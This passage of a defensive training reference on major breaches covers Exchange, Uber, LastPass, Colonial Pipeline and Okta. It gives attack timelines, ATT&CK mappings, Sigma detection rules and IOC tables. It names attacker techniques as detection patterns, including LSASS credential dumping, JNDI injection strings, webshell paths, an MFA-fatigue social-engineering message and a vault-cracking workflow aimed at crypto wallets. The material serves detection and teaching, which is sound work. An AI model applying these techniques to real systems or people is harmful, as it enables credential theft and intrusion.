| **LSASS access** | Process accessing LSASS memory (`procdump`, `comsvcs.dll` MiniDump) | Sysmon Event 10 |
| **Exchange logs** | MailboxExportRequest to web directory path | Exchange PowerShell audit |
| **Network** | Outbound connections from Exchange to unusual IPs | Firewall, NDR |

### 4.6 Sigma Rule — ProxyLogon/ProxyShell Exploitation

```yaml
title: Exchange Server ProxyLogon/ProxyShell SSRF Exploitation Indicators
id: e5f8a1b3-7c2d-4e9f-8a6b-3d1c5e7f2a9b
status: stable
description: Detects IIS log patterns associated with ProxyLogon and ProxyShell exploitation of Microsoft Exchange Server including SSRF and webshell deployment
references:
    - https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
    - https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
author: CIPHER
date: 2021/03/03
modified: 2026/03/15
logsource:
    category: webserver
    product: iis
detection:
    selection_proxylogon_ssrf:
        cs-uri-stem|contains: '/ecp/'
        cs-cookie|contains: 'X-BEResource='
    selection_proxyshell_ssrf:
        cs-uri-stem|contains:
            - '/autodiscover/autodiscover.json'
            - '/mapi/nspi'
            - '/mapi/emsmdb'
        cs-uri-query|contains: '@'
    selection_oab_abuse:
        cs-uri-stem|contains: '/ecp/DDI/DDIService.svc'
        cs-method: 'POST'
    selection_webshell:
        cs-uri-stem|contains:
            - '/owa/auth/'
            - '/ecp/auth/'
        cs-uri-stem|endswith: '.aspx'
        cs-method: 'POST'
    condition: selection_proxylogon_ssrf or selection_proxyshell_ssrf or selection_oab_abuse or selection_webshell
falsepositives:
    - Legitimate Autodiscover requests (filter by presence of @ in URI path vs. query parameter)
    - Exchange admin performing OAB virtual directory configuration via ECP
level: critical
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2021.26855
    - cve.2021.34473
```

### 4.7 Lessons Learned

| Lesson | Actionable Takeaway |
|--------|-------------------|
| **On-prem Exchange is legacy risk** | Migrate to Exchange Online or deploy behind ZTNA; reduce attack surface |
| **Pre-auth SSRF is catastrophic** | Any pre-auth vulnerability in internet-facing service → assume exploitation |
| **Patch lag kills** | 48h between patch and mass exploitation; emergency patching capability required |
| **Multiple actors exploit same vuln** | Once a zero-day goes public, expect APTs, criminals, and script kiddies simultaneously |
| **China Chopper is a cockroach** | One-liner webshells are trivially deployed; file integrity monitoring on web roots is essential |
| **Exchange = domain admin path** | Exchange servers have excessive AD permissions by default; constrain with split permissions |
| **Virtual patching buys time** | CISA EOMT tool and URL rewrite rules provided immediate mitigation while patching |

---

## 5. Uber (2022)

### 5.1 Executive Summary

| Attribute | Detail |
|-----------|--------|
| **Threat Actor** | Lapsus$ affiliate (18-year-old from UK) |
| **Attack Vector** | MFA fatigue (push spam) + social engineering via WhatsApp |
| **Date** | September 15, 2022 |
| **Impact** | Full internal access: Slack, Google Workspace, AWS, GCP, SentinelOne EDR, HackerOne bug bounties |
| **Dwell Time** | Hours (attacker announced presence in Slack) |
| **Root Cause** | Stolen contractor credentials (Raccoon Infostealer), MFA bypass, hardcoded secrets |
| **Prior Breach** | 2016 breach: 57M records; CISO convicted of concealment |

### 5.2 Attack Timeline

| Date/Time | Phase | Event |
|-----------|-------|-------|
| Pre-Sep 15 | Initial Compromise | Uber EXT contractor credentials stolen via Raccoon Infostealer malware |
| Sep 15, ~early | MFA Fatigue | Attacker triggers repeated Duo MFA push notifications to contractor |
| Sep 15, ~early | Social Engineering | Attacker contacts contractor via WhatsApp, impersonates Uber IT, requests MFA approval |
| Sep 15 | MFA Accept | Contractor accepts MFA push — VPN access granted |
| Sep 15 | Discovery | Attacker scans internal network, finds PowerShell script on network share |
| Sep 15 | Credential Harvest | PowerShell script contains hardcoded Thycotic (PAM) admin credentials |
| Sep 15 | Privilege Escalation | Thycotic PAM access → secrets for DA, Duo, OneLogin, AWS, GCP |
| Sep 15 | Lateral Movement | Access Slack, Google Workspace, Confluence, SentinelOne, HackerOne |
| Sep 15, ~18:00 UTC | Announce | Attacker posts in #general Slack: "I announce I am a hacker and Uber has suffered a data breach" |
| Sep 15, ~18:30 UTC | Respond | Uber SOC initially thinks it's a joke; then begins incident response |
| Sep 16 | Contain | Uber disables Slack, internal tools; begins forensic investigation |
| Sep 19 | Public | Uber publishes public disclosure |

### 5.3 Technical Deep Dive

#### MFA Fatigue Attack Chain

```
Stolen Credentials (Raccoon Infostealer)
    └── Attempt VPN login → MFA push triggered
        └── Push #1 → Denied
        └── Push #2 → Denied
        └── Push #3 → Denied
        └── ... (repeated over ~1 hour)
        └── WhatsApp message: "Hi, I'm from Uber IT. We're seeing
            issues with your login. Please accept the next push
            to verify your account."
        └── Push #N → ACCEPTED
            └── VPN connected to internal network
```

#### Post-Access Escalation

```
Internal Network Access (VPN)
    └── Network share scanning
        └── \\share\scripts\deploy.ps1 contains:
            $ThycoticUser = "admin"
            $ThycoticPass = "SuperSecretPAM123!"  # Hardcoded PAM creds
            └── Login to Thycotic Secret Server (PAM)
                └── Extract stored secrets:
                    ├── Domain Admin credentials
                    ├── Duo admin panel credentials
                    ├── OneLogin admin credentials
                    ├── AWS root/IAM credentials
                    ├── GCP service account keys
                    ├── SentinelOne admin console
                    └── HackerOne admin access (vulnerability reports)
```

#### Systems Confirmed Accessed

| System | Access Level | Risk |
|--------|-------------|------|
| **Slack** | Full workspace | Internal comms, IP, incident response visibility |
| **Google Workspace** | Admin | Email, Drive, all employee data |
| **AWS** | Root/Admin | Production infrastructure |
| **GCP** | Admin | Production infrastructure |
| **SentinelOne** | Admin console | Disable/blind EDR across fleet |
| **Duo** | Admin | Manipulate/disable MFA for all users |
| **OneLogin** | Admin | SSO control → access all federated apps |
| **HackerOne** | Admin | Access to unpatched vulnerability reports |
| **Confluence** | Full access | Internal documentation, architecture diagrams |
| **Thycotic PAM** | Admin | Master credential store |

### 5.4 ATT&CK Chain

| Step | Tactic | Technique | Detail |
|------|--------|-----------|--------|
| 1 | Resource Dev | T1589.001 — Gather Credentials | Raccoon Infostealer → contractor creds on dark web |
| 2 | Initial Access | T1078 — Valid Accounts | Stolen VPN credentials |
| 3 | Initial Access | T1621 — MFA Request Generation | Push notification spam (MFA fatigue) |
| 4 | Initial Access | T1566.004 — Spearphishing Voice | WhatsApp social engineering |
| 5 | Discovery | T1083 — File and Directory Discovery | Network share scanning |
| 6 | Credential Access | T1552.001 — Credentials in Files | Hardcoded PAM creds in PowerShell script |
| 7 | Credential Access | T1555 — Credentials from Password Stores | Thycotic PAM secret extraction |
| 8 | Privilege Escalation | T1078.002 — Domain Accounts | Domain admin via PAM |
| 9 | Lateral Movement | T1534 — Internal Spearphishing | Slack access for further social engineering |
| 10 | Defense Evasion | T1562 — Impair Defenses | SentinelOne admin access (could disable EDR) |
| 11 | Collection | T1213 — Data from Information Repositories | Confluence, Google Drive |

### 5.5 Detection Opportunities

| Detection Point | Method | Data Source |
|----------------|--------|-------------|
| **MFA anomaly** | >3 push notifications denied within 1 hour for same user | Duo/Okta logs |
| **VPN geo/time** | Login from unusual location or outside business hours | VPN logs, UEBA |
| **PAM access** | Bulk secret retrieval from Thycotic/CyberArk | PAM audit logs |
| **Lateral scope** | Single identity accessing AWS + GCP + Slack admin within short window | SIEM correlation |
| **EDR admin** | Non-SOC account accessing SentinelOne management console | SentinelOne audit log |
| **Network share** | Access to script shares from VPN-connected endpoint | Windows Security Event 5140 |
| **Impossible travel** | Contractor's legitimate location vs. attacker's VPN source IP | UEBA, IdP logs |

### 5.6 Sigma Rule — MFA Fatigue Detection

```yaml
title: Potential MFA Fatigue Attack — Repeated Push Denials Followed by Accept
id: f7a9c3e5-2b8d-4f1a-9e6c-8d3b5a7f2c1e
status: stable
description: Detects pattern of multiple denied MFA push notifications followed by an approval, indicative of MFA fatigue social engineering attack
references:
    - https://www.uber.com/newsroom/security-update/
    - https://attack.mitre.org/techniques/T1621/
author: CIPHER
date: 2022/09/16
modified: 2026/03/15
logsource:
    category: authentication
    product: duo
detection:
    selection_denied:
        action: 'denied'
        factor: 'push'
    selection_approved:
        action: 'success'
        factor: 'push'
    timeframe: 1h
    condition: selection_denied | count(user) > 3 and selection_approved
falsepositives:
    - User with new phone having difficulty completing MFA setup
    - Areas with poor mobile connectivity causing delayed push delivery
level: high
tags:
    - attack.initial_access
    - attack.t1621
    - attack.credential_access
```

### 5.7 Lessons Learned

| Lesson | Actionable Takeaway |
|--------|-------------------|
| **MFA push is not phishing-resistant** | Deploy FIDO2/WebAuthn hardware keys; number matching at minimum |
| **Contractors are in-scope** | Same security controls, monitoring, and credential hygiene for all identities |
| **Hardcoded secrets are breach accelerants** | Secrets scanning in CI/CD (truffleHog, gitleaks); rotate on detection |
| **PAM is a crown jewel** | PAM access should require step-up auth, just-in-time approval, and anomaly alerting |
| **SOC must take all alerts seriously** | Attacker announced in Slack and was initially dismissed as a joke |
| **EDR admin access from compromised identity = blind spot** | Separate admin paths for security tools; break-glass only |
| **Infostealer malware is the new phishing** | Monitor for corporate creds on dark web marketplaces; assume credential compromise |

---

## 6. LastPass (2022-2023)

### 6.1 Executive Summary

| Attribute | Detail |
|-----------|--------|
| **Threat Actor** | Attributed to UNC unknown; sophisticated, likely nation-state or advanced criminal |
| **Attack Vector** | Targeted compromise of senior DevOps engineer's home workstation |
| **Duration** | Incident 1: Aug 2022; Incident 2: Aug-Oct 2022; Disclosed Dec 2022, updated Mar 2023 |
| **Impact** | Customer vault data exfiltrated (encrypted + unencrypted metadata); 25M+ users affected |
| **Root Cause** | Only 4 engineers had AWS key access; attacker targeted one via home Plex server vulnerability |
| **Key Weakness** | Legacy PBKDF2 iterations (5,000 default for older accounts); unencrypted vault URLs |
| **Downstream** | $4.4M+ in crypto theft attributed to cracked LastPass vaults (as of 2024) |

### 6.2 Attack Timeline

| Date | Phase | Event |
|------|-------|-------|
| Aug 12, 2022 | Incident 1 | Developer workstation compromised via stolen credentials; source code repo accessed |
| Aug 25, 2022 | Disclose 1 | LastPass discloses "unauthorized access to development environment" |
| Sep 2022 | Pivot | Attacker uses information from Incident 1 to identify high-value targets |
| ~Oct 2022 | Target | Attacker identifies that only 4 DevOps engineers have AWS decryption key access |
| ~Oct 2022 | Exploit | Attacker exploits vulnerability in Plex Media Server on engineer's home computer |
| ~Oct 2022 | Keylog | Keylogger deployed; captures master password for corporate password vault |
| ~Oct 2022 | Access | Attacker authenticates to LastPass AWS environment with stolen credentials + MFA |
| Oct-Nov 2022 | Exfil | Cloud storage backups exfiltrated: encrypted vaults + unencrypted metadata |
| Dec 22, 2022 | Disclose 2 | LastPass discloses customer vault data breach |
| Feb 2023 | Disclose 3 | LastPass reveals second incident details; DevOps engineer home compromise |
| Mar 2023 | Update | Full technical details published; Plex vulnerability identified |
| 2023-2024 | Impact | $4.4M+ cryptocurrency stolen from users whose vault passwords were cracked |
| Oct 2023 | Crypto Theft | ZachXBT and MetaMask researchers link crypto thefts to LastPass breach |

### 6.3 Technical Deep Dive

#### Incident 1 — Source Code Theft

```
Developer workstation compromise (stolen credentials)
    └── Access to LastPass development environment
        └── Source code repositories accessed:
            ├── LastPass client code
            ├── Internal technical documentation
            ├── Infrastructure-as-code configurations
            └── Internal tool configurations
        └── Key intel gathered:
            ├── Architecture of vault storage
            ├── AWS infrastructure topology
            ├── List of DevOps engineers with key access
            └── Details of cloud storage configuration
```

#### Incident 2 — Home Computer Exploitation

```
Enumerate high-value targets from Incident 1 intel
    └── Identify 4 DevOps engineers with AWS S3 decryption keys
        └── Target senior engineer's home network
            └── Exploit CVE in Plex Media Server (home computer)
                └── Deploy keylogger + credential stealer
                    └── Capture engineer's master password
                        └── Authenticate to LastPass corporate vault
                            └── Retrieve AWS credentials + MFA seeds
                                └── Access AWS S3 buckets
                                    └── Exfiltrate cloud backups
```

#### What Was Stolen — Vault Data Structure

| Data Element | Encrypted? | Encryption | Risk |
|-------------|-----------|------------|------|
| **Website URLs** | No | Plaintext | Full browsing/account history visible |
| **Usernames** | No | Plaintext | Account enumeration across services |
| **Notes (legacy)** | Some plaintext | Mixed | Sensitive data in notes exposed |
| **Passwords** | Yes | AES-256-CBC | Protected by master password derivation |
| **Secure Notes (current)** | Yes | AES-256-CBC | Protected by master password derivation |
| **Form fill data** | Yes | AES-256-CBC | Protected by master password derivation |
| **TOTP seeds** | Yes | AES-256-CBC | If cracked: MFA bypass for stored accounts |
| **Vault metadata** | No | Plaintext | Organization structure, sharing groups |

#### Key Derivation Weakness

```
Vault decryption chain:
    Master Password
        → PBKDF2-HMAC-SHA256 (client-side)
            iterations: variable per account age
                ├── Pre-2018 accounts: 5,000 iterations (WEAK)
                ├── 2018-2022 accounts: 100,100 iterations
                └── Post-breach recommendation: 600,000 iterations
            → Derived encryption key
                → AES-256-CBC decrypt vault entries
```

| Account Era | PBKDF2 Iterations | Crack Feasibility (RTX 4090, 12-char password) |
|-------------|-------------------|----------------------------------------------|
| Pre-2018 | 5,000 | Days to weeks for dictionary attacks |
| 2018 default | 100,100 | Months for targeted attacks |
| Current rec. | 600,000 | Years for strong passwords |

**Critical flaw**: LastPass never force-migrated old accounts to higher iteration counts. Users who created accounts in 2013 with 5,000 iterations retained that setting unless they manually changed it.

#### Confirmed Downstream Impact — Crypto Theft

```
Attacker workflow for crypto theft:
1. Offline brute-force/dictionary attack on stolen vaults
2. Prioritize vaults with cryptocurrency-related URLs:
   - blockchain.com, coinbase.com, metamask.io, etc.
3. Extract seed phrases, private keys, wallet passwords from:
   - Encrypted passwords (after crack)
   - Secure notes containing seed phrases
4. Drain cryptocurrency wallets
```

| Date | Amount Stolen | Attribution Confidence |
|------|--------------|----------------------|
| Oct 2023 | $4.4M (25 victims) | High — ZachXBT investigation |
| Feb 2024 | $6.2M additional | High — on-chain analysis |
| Combined 2023-2024 | $35M+ estimated total | Medium — ongoing investigation |

### 6.4 ATT&CK Chain

| Step | Tactic | Technique | Detail |
|------|--------|-----------|--------|
| 1 | Reconnaissance | T1591 — Gather Victim Org Info | Incident 1 intel used to plan Incident 2 |
| 2 | Initial Access | T1078 — Valid Accounts | Stolen developer credentials (Incident 1) |
| 3 | Initial Access | T1190 — Exploit Public-Facing App | Plex Media Server vulnerability (Incident 2) |
| 4 | Execution | T1059 — Command and Scripting | Keylogger/stealer deployment on home PC |
| 5 | Credential Access | T1056.001 — Keylogging | Master password capture from home workstation |
| 6 | Credential Access | T1555 — Credentials from Password Stores | Corporate vault access with stolen master password |
| 7 | Persistence | T1078.004 — Cloud Accounts | AWS credentials from corporate vault |
| 8 | Collection | T1530 — Data from Cloud Storage | S3 bucket backup exfiltration |
| 9 | Exfiltration | T1537 — Transfer to Cloud Account | Vault backups transferred out of AWS |
| 10 | Impact | T1485 — Data Destruction | Effective destruction of vault confidentiality |

### 6.5 Detection Opportunities

| Detection Point | Method | Data Source |
|----------------|--------|-------------|
| **S3 access patterns** | Bulk object listing/download from backup buckets | CloudTrail S3 data events |
| **Unusual auth** | DevOps engineer authenticating from non-corporate IP | AWS CloudTrail, IdP logs |
| **Credential vault access** | Bulk secret retrieval from corporate password manager | Vault audit logs |
| **Home network anomaly** | Corporate VPN connection from IP with Plex server exposed | VPN logs, network intel |
| **Data volume** | Large egress from S3 backup buckets | CloudTrail, VPC Flow Logs, AWS Cost alerts |
| **Key usage** | S3 decryption key used outside normal backup windows | CloudTrail KMS events |

### 6.6 Sigma Rule — Cloud Backup Exfiltration

```yaml
title: Suspicious Bulk S3 Object Download from Backup Bucket
id: a1b2c3d4-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: stable
description: Detects high-volume GetObject API calls to S3 backup buckets which may indicate data exfiltration of stored backups
references:
    - https://support.lastpass.com/s/document-item?language=en_US&bundleId=lastpass&topicId=LastPass/incident-2-702.html
author: CIPHER
date: 2023/03/01
modified: 2026/03/15
logsource:
    product: aws
    service: cloudtrail
detection:
    selection:
        eventName:
            - 'GetObject'
            - 'ListObjectsV2'
            - 'ListBucketVersions'
        requestParameters.bucketName|contains:
            - 'backup'
            - 'vault'
            - 'archive'
    timeframe: 1h
    condition: selection | count(requestParameters.key) > 50
falsepositives:
    - Scheduled backup restoration testing
    - Disaster recovery drills
    - Automated compliance scanning of backup integrity
level: high
tags:
    - attack.exfiltration
    - attack.t1537
    - attack.collection
    - attack.t1530
```

### 6.7 Sigma Rule — Home Network as Attack Vector

```yaml
title: Corporate Authentication from IP Hosting Public Services
id: d4e5f6a7-8b9c-0d1e-2f3a-4b5c6d7e8f9a
status: experimental
description: Detects corporate VPN or SSO authentication originating from IP addresses known to host public-facing services like Plex, indicating potential home network compromise
author: CIPHER
date: 2023/03/01
modified: 2026/03/15
logsource:
    category: authentication
detection:
    selection:
        action: 'success'
        src_ip|cidr:
            - '0.0.0.0/0'  # Customize with non-corporate IP ranges
    filter_corporate:
        src_ip|cidr:
            - '10.0.0.0/8'
            - '172.16.0.0/12'
            - '192.168.0.0/16'
    condition: selection and not filter_corporate
falsepositives:
    - Legitimate remote workers on home networks
    - Note: This is a baseline rule; enrich with threat intel on IPs hosting Plex/other services
level: low
tags:
    - attack.initial_access
    - attack.t1078
```

### 6.8 Lessons Learned

| Lesson | Actionable Takeaway |
|--------|-------------------|
| **Home networks are corporate attack surface** | DevOps/SRE home environments need security baselines: patching, segmentation, EDR |
| **Only 4 people with keys = 4 targets** | Small key-holder groups concentrate risk; implement threshold cryptography or HSM-backed access |
| **Key derivation defaults must evolve** | Force-migrate all accounts to current PBKDF2 minimums; better: migrate to Argon2id |
| **Unencrypted metadata is sensitive** | URLs, usernames, vault structure — all valuable without decryption |
| **Incident 1 enabled Incident 2** | Source code theft provided roadmap; assume any breach enables future, worse breach |
| **Offline attacks are forever** | Stolen encrypted vaults can be attacked indefinitely as hardware improves |
| **Password managers must assume vault theft** | Design for "encrypted data stolen" scenario: strong KDF, zero unencrypted metadata |
| **Cryptocurrency in vaults = immediate financial impact** | Seed phrases in password managers are high-value targets; hardware wallets preferred |

---

## Appendix A: Cross-Breach Detection Matrix

Priority detection capabilities that would have caught multiple breaches:

| Detection Capability | SolarWinds | Log4Shell | MOVEit | Exchange | Uber | LastPass | Priority |
|---------------------|-----------|-----------|--------|----------|------|---------|----------|
| Process ancestry anomaly | X | X | X | X | | | **P0** |
| Webshell file creation monitoring | | | X | X | | | **P0** |
| Egress traffic baseline | X | X | X | X | | X | **P0** |
| MFA anomaly detection | | | | | X | | **P1** |
| PAM/credential store access audit | | | | | X | X | **P1** |
| DNS analytics (entropy, new domains) | X | X | | | | | **P1** |
| Build/CI/CD integrity monitoring | X | | | | | | **P1** |
| Cloud storage access anomaly | | | | | | X | **P2** |
| SAML/token anomaly detection | X | | | | | | **P2** |
| WAF with bypass-resistant rules | | X | X | X | | | **P1** |
| Supply chain / SBOM tracking | X | X | X | | | | **P1** |
| Secrets scanning in repos/shares | | | | | X | | **P1** |

---

## Appendix B: Defensive Priorities by Breach Type

### Supply Chain (SolarWinds, MOVEit, Log4Shell)

```
1. SBOM for all production software
2. Build provenance verification (SLSA)
3. Vendor security assessment (not just questionnaires)
4. Network segmentation for vendor-managed systems
5. Behavioral analysis for signed/trusted binaries
6. Egress filtering from application tier
```

### Web Application RCE (Log4Shell, MOVEit, Exchange)

```
1. Patch management — emergency patching within 24h for critical pre-auth RCE
2. WAF with virtual patching capability
3. Web root file integrity monitoring
4. Process ancestry monitoring (web server → shell = alert)
5. Egress filtering — block LDAP/RMI outbound
6. Network segmentation — web tier cannot reach internal directly
```

### Identity/Social Engineering (Uber, LastPass)

```
1. FIDO2/WebAuthn for all privileged access
2. MFA fatigue detection rules
3. Secrets scanning — no hardcoded credentials
4. PAM with just-in-time access and anomaly alerting
5. UEBA for impossible travel and behavioral anomalies
6. Home network security baselines for key personnel
```

---

## Appendix C: MITRE ATT&CK Technique Frequency

Techniques observed across all 6 breaches, ranked by frequency:

| Technique | ID | Occurrences | Breaches |
|-----------|----|-------------|----------|
| Exploit Public-Facing Application | T1190 | 4 | Log4Shell, MOVEit, Exchange, LastPass |
| Valid Accounts | T1078 | 3 | Uber, LastPass, SolarWinds (post-exploit) |
| Web Shell | T1505.003 | 3 | Log4Shell, MOVEit, Exchange |
| Command and Scripting Interpreter | T1059 | 5 | All except SolarWinds (initially) |
| Exfiltration Over C2 Channel | T1041 | 4 | SolarWinds, Log4Shell, MOVEit, Exchange |
| Credentials from Password Stores | T1555 | 2 | Uber, LastPass |
| Indicator Removal | T1070 | 2 | MOVEit, LastPass |
| Data from Cloud Storage | T1530 | 2 | MOVEit, LastPass |

---

## Appendix D: Quick Reference — IOC Patterns

### Network-Based

| Breach | IOC Type | Pattern |
|--------|----------|---------|
| SolarWinds | Domain | `avsvmcloud[.]com` and subdomains |
| SolarWinds | IP ranges | Residential proxy IPs in victim's country |
| Log4Shell | Protocol | Outbound LDAP (389/636), RMI (1099) from app servers |
| Log4Shell | URI pattern | `${jndi:` in any HTTP field |
| MOVEit | URI | `/moveitisapi/moveitisapi.dll` with SQL metacharacters |
| MOVEit | Header | `X-siLock-Comment` custom header |
| Exchange | Cookie | `X-BEResource=` in non-ECP requests |
| Exchange | URI | `/autodiscover/autodiscover.json` with `@` in path |

### Host-Based

| Breach | IOC Type | Pattern |
|--------|----------|---------|
| SolarWinds | Named pipe | `583da945-62af-10e8-4902-a8f205c72b2e` |
| SolarWinds | DLL | Modified `SolarWinds.Orion.Core.BusinessLayer.dll` |
| MOVEit | Webshell | `human2.aspx` in MOVEit web root |
| Exchange | Webshell | New `.aspx` files in `/owa/auth/` or `/ecp/auth/` |
| Exchange | Process tree | `w3wp.exe` → `cmd.exe` or `powershell.exe` |
| Uber | Lateral | Anomalous Slack API token usage patterns |
| LastPass | Cloud | Bulk `GetObject` on backup S3 buckets |

---

*End of Part 1. Part 2 continues below.*

---
---

# Breach Case Studies — Deep Reference (Part 2)
> CIPHER Training Module | Compiled 2026-03-15

---

## 7. Colonial Pipeline (2021)

### Overview

| Field | Detail |
|-------|--------|
| Victim | Colonial Pipeline Company |
| Sector | Critical infrastructure — fuel pipeline (East Coast US, 5,500 miles) |
| Threat Actor | DarkSide (RaaS affiliate model) |
| Malware | DarkSide ransomware |
| Initial Access | Compromised VPN credential (legacy account, no MFA) |
| Impact | 6-day pipeline shutdown, fuel shortages across southeastern US, $4.4M ransom paid (63.7 BTC; $2.3M later recovered by DOJ) |
| Regulatory Fallout | TSA Security Directives for pipeline operators, Executive Order 14028 acceleration |

### Attack Timeline

| Date | Event | Phase |
|------|-------|-------|
| ~April 2021 | Credential for legacy VPN account exposed (likely via dark web dump or prior breach) | Pre-compromise |
| 2021-04-29 | DarkSide affiliate authenticates to Colonial VPN using compromised credential | Initial Access |
| 2021-04-29 – 2021-05-06 | Lateral movement through IT network; internal reconnaissance; data exfiltration (~100 GB) | Lateral Movement / Exfil |
| 2021-05-07 | DarkSide ransomware deployed across IT systems; ransom note delivered | Execution / Impact |
| 2021-05-07 | Colonial discovers ransom note; IT team begins containment | Detection |
| 2021-05-07 | Colonial proactively shuts down OT pipeline systems as precaution | Impact (self-imposed) |
| 2021-05-08 | FBI engaged; incident response firms (Mandiant) brought in | Response |
| 2021-05-08 | President Biden briefed; CISA issues advisory | Escalation |
| 2021-05-10 | Emergency declaration by USDOT (fuel transport waivers) | External Impact |
| 2021-05-11 | Colonial pays $4.4M ransom in Bitcoin | Ransom Payment |
| 2021-05-12 | Decryptor provided by DarkSide (too slow; Colonial restored from backups primarily) | Recovery |
| 2021-05-12 | Pipeline restart initiated | Recovery |
| 2021-05-13 | DarkSide announces shutdown of operations (likely due to law enforcement pressure) | Threat Actor Response |
| 2021-05-15 | Pipeline fully operational | Recovery Complete |
| 2021-06-07 | DOJ recovers 63.7 BTC ($2.3M) from DarkSide wallet | Law Enforcement |

### MITRE ATT&CK Chain

| Tactic | Technique | ID | Detail |
|--------|-----------|----|--------|
| Initial Access | Valid Accounts: VPN | T1078.001 | Legacy VPN account with password reuse, no MFA |
| Persistence | Valid Accounts | T1078 | Maintained access through legitimate VPN credentials |
| Discovery | Network Service Discovery | T1046 | Mapped internal IT network topology |
| Discovery | Account Discovery | T1087 | Enumerated domain accounts and admin groups |
| Lateral Movement | Remote Services | T1021 | Moved through IT network using valid credentials and RDP |
| Collection | Data from Local System | T1005 | Staged ~100 GB of internal data |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | Data exfiltrated before ransomware deployment |
| Impact | Data Encrypted for Impact | T1486 | DarkSide ransomware deployed across IT systems |
| Impact | System Shutdown/Reboot | T1529 | OT systems shut down proactively by Colonial (not by attacker) |

### Detection Opportunities

| Detection Point | Data Source | Logic | ATT&CK Coverage |
|----------------|-------------|-------|-----------------|
| VPN login from legacy/dormant account | VPN logs, IAM | Alert on authentication from accounts inactive >90 days | T1078.001 |
| VPN login without MFA | VPN auth logs | Flag any VPN session that bypasses MFA enforcement | T1078.001 |
| Credential match against dark web dumps | Threat intelligence feeds | Continuous monitoring of exposed credentials against active accounts | T1078 |
| Anomalous data volume egress | Netflow, DLP | Baseline deviation: >10 GB outbound in 24h from internal hosts | T1041 |
| Mass file encryption patterns | EDR, file integrity monitoring | Rapid file extension changes, high entropy writes across multiple shares | T1486 |
| Lateral movement via RDP from unusual source | Windows Security logs (4624 Type 10) | RDP sessions from hosts not in admin jump-box list | T1021.001 |
| IT-to-OT network boundary crossing | Network segmentation monitoring | Any traffic from IT VLAN to OT VLAN that is not explicitly whitelisted | Lateral Movement |

### Key Lessons

```
1. MFA IS NOT OPTIONAL ON REMOTE ACCESS
   - A single VPN account without MFA = full network compromise
   - Legacy/dormant accounts are prime targets; enforce lifecycle management
   - CIS Control 6.3: Require MFA for externally-exposed applications

2. IT/OT SEGMENTATION DETERMINES BLAST RADIUS
   - Colonial shut down OT proactively because they could not confirm IT/OT separation
   - If you cannot prove segmentation, assume it does not exist
   - IEC 62443 zones and conduits; Purdue Model enforcement

3. CREDENTIAL HYGIENE AT SCALE
   - The compromised password appeared in a prior data breach
   - Dark web credential monitoring is not optional for critical infrastructure
   - Automated deprovisioning of accounts not used within 90 days

4. RANSOMWARE DECRYPTORS ARE OFTEN USELESS
   - DarkSide decryptor was too slow; Colonial restored from backups
   - Paying ransom does not guarantee recovery speed
   - Immutable, tested backups are the actual recovery mechanism

5. CRITICAL INFRASTRUCTURE CASCADING EFFECTS
   - 6-day shutdown caused fuel shortages, panic buying, flight disruptions
   - Business continuity planning must account for societal dependencies
   - TSA Security Directives now mandate: incident reporting, cyber response plans, CISA assessments
```

### Sigma Rule — VPN Authentication from Dormant Account

```yaml
title: VPN Login from Dormant or Legacy Account
id: 8f3a1c47-6e2d-4b91-a8f5-3d7c9e0b2a14
status: experimental
description: Detects VPN authentication from accounts that have been inactive for extended periods, indicating potential credential abuse from dark web dumps or prior breaches
references:
  - https://www.mandiant.com/resources/blog/colonial-pipeline-darkside
logsource:
  category: authentication
  product: vpn
detection:
  selection:
    action: login
    result: success
  filter_active_accounts:
    account_last_active|lte: 90  # days since last login
  condition: selection and not filter_active_accounts
falsepositives:
  - Seasonal contractors returning after extended absence
  - Emergency accounts activated during disaster recovery
level: high
tags:
  - attack.initial_access
  - attack.t1078.001
  - attack.valid_accounts
```

### Sigma Rule — Anomalous Outbound Data Volume

```yaml
title: Large Outbound Data Transfer Indicating Exfiltration
id: 2b8e4f91-3a6c-4d72-b5e8-1c9f0a7d3e26
status: experimental
description: Detects outbound data transfers exceeding baseline thresholds from internal hosts, indicative of pre-ransomware data exfiltration
logsource:
  category: network_connection
  product: firewall
detection:
  selection:
    direction: outbound
    bytes_out|gte: 1073741824  # 1 GB threshold per connection
  filter_known:
    dst_ip|cidr:
      - '10.0.0.0/8'        # internal
      - '172.16.0.0/12'     # internal
  condition: selection and not filter_known
falsepositives:
  - Cloud backup services to sanctioned endpoints
  - Large software update distributions
  - Video conferencing egress from heavy users
level: high
tags:
  - attack.exfiltration
  - attack.t1041
```

---

## 8. Okta Support System Breach (2023)

### Overview

| Field | Detail |
|-------|--------|
| Victim | Okta, Inc. (and downstream customers) |
| Sector | Identity and access management (SaaS) |
| Threat Actor | Unattributed; suspected financially motivated |
| Attack Vector | Stolen Okta employee credential to support case management system |
| Data Compromised | HAR files containing session tokens for customer support cases |
| Impact | All Okta customer support system users affected (~134 customers initially notified; later revised to ALL customers with support interactions) |
| Cascading Victims | BeyondTrust, Cloudflare, 1Password (detected and contained) |

### Attack Timeline

| Date | Event | Phase |
|------|-------|-------|
| 2023-09-28 | Threat actor gains access to Okta support case management system using stolen employee credential | Initial Access |
| 2023-09-28 – 2023-10-17 | Attacker browses customer support cases, downloads HAR files containing session tokens and cookies | Collection |
| 2023-09-29 | BeyondTrust detects unauthorized Okta admin activity; notifies Okta (Okta initially dismisses) | Detection (External) |
| 2023-10-02 | Cloudflare detects suspicious activity linked to Okta compromise; notifies Okta | Detection (External) |
| 2023-10-11 | 1Password detects anomalous Okta admin activity; reports to Okta | Detection (External) |
| 2023-10-17 | Okta identifies and contains the compromise | Containment |
| 2023-10-20 | Okta discloses breach publicly; initially states 134 customers affected (~1% of customer base) | Disclosure |
| 2023-11-03 | Okta revises scope: attacker accessed data for ALL customers who used the support system | Scope Revision |
| 2023-11-29 | Okta reveals attacker ran report on all customer support system users; names and emails for ALL customers exposed | Full Disclosure |

### MITRE ATT&CK Chain

| Tactic | Technique | ID | Detail |
|--------|-----------|----|--------|
| Initial Access | Valid Accounts: Cloud Accounts | T1078.004 | Stolen Okta employee credential for support system |
| Credential Access | Steal Web Session Cookie | T1539 | Extracted session tokens from HAR files in support cases |
| Collection | Data from Information Repositories | T1213 | Browsed and downloaded customer support case files |
| Collection | Automated Collection | T1119 | Ran bulk reports against customer database |
| Lateral Movement | Use Alternate Authentication Material: Web Session Cookie | T1550.004 | Used stolen session tokens to access customer Okta tenants |
